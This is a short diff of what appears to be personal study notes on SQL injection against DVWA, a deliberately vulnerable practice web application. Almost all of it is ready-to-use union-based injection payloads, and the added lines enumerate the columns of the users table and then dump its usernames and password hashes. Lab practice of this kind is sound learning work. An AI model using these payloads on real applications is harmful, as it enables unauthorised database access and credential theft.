@@ -144,3 +144,8 @@ Spli
 			1' union select table_name,1 from information_schema.tables#
 		# table name of dvwa schema
 			1' union select table_name,1 from information_schema.tables where table_schema='dvwa'#
+		
+		colume of the schema#
+			1' union select column_name,1 from information_schema.columns where table_schema='dvwa' and table_name='users'#
+		# toe get the content of a table of a particular schema 
+			1' union select user,password from dvwa.users#
